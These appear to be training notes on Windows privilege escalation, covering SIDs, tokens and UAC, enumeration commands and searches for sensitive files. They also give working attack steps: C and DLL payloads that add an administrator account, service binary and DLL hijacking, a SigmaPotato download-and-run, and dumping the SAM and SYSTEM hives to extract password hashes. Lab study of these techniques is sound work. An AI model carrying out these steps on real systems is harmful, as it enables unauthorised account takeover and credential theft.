# Windows Privilege Escalation – Expanded Notes

## Enumerating Windows

### Windows Privileges and Access Control

**Security Identifier (SID)**  
A SID is a unique identifier used to identify user, group, and computer accounts. These values are generated:
- Locally by the **Local Security Authority (LSA)** for local users
- By the **Domain Controller** for domain users

SIDs are immutable after creation. They follow the structure:
```
S-R-X-Y
```
- `S`: Literal identifier prefix
- `R`: Revision number (typically 1)
- `X`: Identifier Authority (e.g., `5` for NT Authority)
- `Y`: Sub-authorities including Domain ID and Relative ID (RID)

**Examples:**
- `S-1-1-0` – Everybody
- `S-1-5-18` – Local System
- `S-1-5-21-...-500` – Default Administrator account
- `S-1-5-21-...-1001` – First created standard user

---

### Access Tokens and Impersonation

**Access Tokens** contain:
- User SID
- Group SIDs
- Privileges
- Integrity level

**Token Types:**
- **Primary Token**: Assigned to a process and defines what it can access.
- **Impersonation Token**: Assigned to threads, allowing them to impersonate another user's permissions.

**Mandatory Integrity Control (MIC)**  
Used to restrict access based on **integrity levels**:
- **System**: Kernel/system processes
- **High**: Admin processes
- **Medium**: Standard user processes
- **Low**: Restricted processes like browsers
- **Untrusted**: Extremely restricted

**Checking Integrity:**
- `whoami /groups`
- `icacls` for file/object integrity
- **Process Explorer** can visually inspect process integrity

---

### User Account Control (UAC)

Even Admins receive two tokens at login:
1. A **standard user token** (used by default)
2. An **elevated admin token** (used when needed)

This dual-token model prevents applications from auto-running with admin rights without explicit consent.

---

## Situational Awareness

### Basic Enumeration

#### User Context:
```powershell
whoami
whoami /groups
```

#### Local Users & Groups:
```powershell
Get-LocalUser
net user
Get-LocalGroup
net localgroup
Get-LocalGroupMember "<group name>"
```

#### System Info:
```powershell
systeminfo
```

#### Network Info:
```powershell
ipconfig /all
route print
netstat -ano
```

---

### Installed Applications and Processes

**Applications:**
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select displayname
```

**Running Processes:**
```powershell
Get-Process
Get-Process -Name <name> | Select-Object Path, Id
```

---

### Searching for Sensitive Files

Users are often lazy and store sensitive information in plain text. Examples:
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.doc*,*.xls* -File -Recurse -ErrorAction SilentlyContinue
```

Comprehensive search:
```powershell
Get-ChildItem -Path C:\Users\ `
-Include *.txt,*.pdf,*.xls*,*.doc*,*.ini,*.csv,*.json,*.config,*.ps1,*.bat,*.cmd,*.log,*.bak,*.rdp `
-File -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime
```

---

## PowerShell Logging and Artifacts

### History & Transcripts

- `Get-History`: view current session command history
- `(Get-PSReadlineOption).HistorySavePath`: persistent history location
- Transcript files log command output
- **Script Block Logging** (Event ID 4104): logs full PowerShell scripts and command context

---

## Tools for Enumeration

### winPEAS
Copy to target:
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server
```

Fetch on target:
```powershell
iwr -uri http://<IP>/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

### Seatbelt
```powershell
.\Seatbelt.exe -group=all
```

---

## Privilege Escalation Vectors

### Service Binary Hijacking

**Scenario**: Unprotected service binary that any user can overwrite.

1. Identify the service:
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

2. Check permissions:
```powershell
icacls "C:\path\to\binary.exe"
```

3. Create payload (adduser.c):
```c
#include <stdlib.h>
int main() {
    system("net user dave2 Password123@ /add");
    system("net localgroup administrators dave2 /add");
    return 0;
}
```

4. Compile:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

5. Replace service binary and restart service:
```powershell
net stop <service>
net start <service>
```

---

### DLL Hijacking

**Concept**: Replace or place a malicious DLL in a directory that’s loaded by a service due to an insecure search order.

DLL Template (C++) – `adduser.dll`:
```cpp
BOOL APIENTRY DllMain(...) {
    system("net user dave2 Password123@ /add");
    system("net localgroup administrators dave2 /add");
    return TRUE;
}
```

Compile and inject into first-searched directory.

---

### Unquoted Service Paths

**Concept**: Exploit improperly quoted service paths with spaces to inject executables.

Find:
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Inject:
```bash
Create malicious Program.exe and place it in C:```

---

### Scheduled Tasks

Check for exploitable tasks:
```cmd
schtasks /query /fo LIST /v
```

Evaluate:
- Owner of task
- Trigger condition
- Executed command

---

## Using Exploits and Potatoes

### Patch Assessment

```powershell
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

---

### SigmaPotato

Used for exploiting `SeImpersonatePrivilege` via named pipe impersonation.

```bash
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
.\SigmaPotato "cmd.exe /c whoami"
```

---

### Backup Privilege

If `SeBackupPrivilege` is available:

```powershell
reg save HKLM\SAM C:\Users\Public\sam.save
reg save HKLM\SYSTEM C:\Users\Public\system.save
```

Then on attacker box:
```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

---

This document is designed as a foundational resource for Windows privilege escalation. Continue to adapt and expand these notes as you progress through labs and real-world scenarios.
